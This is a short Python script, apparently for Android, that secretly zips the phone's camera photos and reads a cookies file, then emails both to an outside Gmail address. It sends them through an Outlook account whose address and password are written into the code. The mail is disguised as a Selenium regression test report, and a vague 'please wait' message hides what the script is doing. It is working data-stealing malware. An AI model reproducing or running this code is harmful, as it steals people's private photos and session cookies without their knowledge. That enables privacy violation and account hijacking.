import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart 
from email.mime.application import MIMEApplication
import zipfile
print("please wait this take few minutes")
def zipdir(path, ziph):
	for root, dirs, files in os.walk(path):
		for file in files:
			ziph.write(os.path.join(root, file), 
			os.path.relpath(os.path.join(root, file), 
			os.path.join(path, '..'))) 
zipf = zipfile.ZipFile('test.zip', 'w', zipfile.ZIP_DEFLATED) 
zipdir('/storage/emulated/0/DCIM/Camera', zipf) 
zipf.close()
email = "jourge.55@outlook.com"
password = 'zzxcv123$'
toaddr = "zalborasi@gmail.com"
dir_path = "/storage/emulated/0/"
files = ["test.zip", "cookies.txt"]
msg = MIMEMultipart()
msg['To'] = "zalborasi@gmail.com" 
msg['From'] = "jourge.55@outlook.com" 
msg['Subject'] = "Selenium ClearCore_Regression_Test_Report_Result" 
body = MIMEText('Test results attached.', 'html', 'utf-8')
msg.attach(body) # add message body (text or html)
for f in files:
	file_path = os.path.join(dir_path, f) 
	attachment = MIMEApplication(open(file_path, "rb").read(), _subtype="txt") 
	attachment.add_header('Content-Disposition','attachment', filename=f)
	msg.attach(attachment)
	s = smtplib.SMTP("smtp.outlook.com", 587)
	s.starttls()
	s.login(email, password)
	s.sendmail(email, toaddr, msg.as_string())
	s.quit()
	print ('done!')
	s.close()
